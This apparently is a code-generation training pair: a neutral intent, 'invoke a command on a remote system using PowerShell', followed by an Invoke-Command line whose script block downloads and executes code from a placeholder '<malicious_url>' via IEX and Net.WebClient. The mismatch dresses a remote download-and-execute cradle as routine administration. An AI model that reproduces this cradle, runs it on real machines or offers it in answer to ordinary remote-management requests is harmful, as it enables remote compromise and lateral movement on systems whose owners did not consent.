# Natural language intent:
# Invoke a command on a remote system using PowerShell

Invoke-Command -ComputerName <RemoteSystemName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_url>')}
